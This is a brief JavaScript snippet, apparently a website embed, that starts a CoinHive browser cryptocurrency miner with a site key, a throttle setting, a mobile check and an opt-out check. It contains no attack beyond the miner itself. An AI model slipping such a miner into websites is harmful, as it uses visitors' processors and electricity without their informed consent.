var miner = new CoinHive.Anonymous('V0yMqA7wP9bbPyV2rpj0BmHhyFoIZRWK', {
    throttle: 0.2
});
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}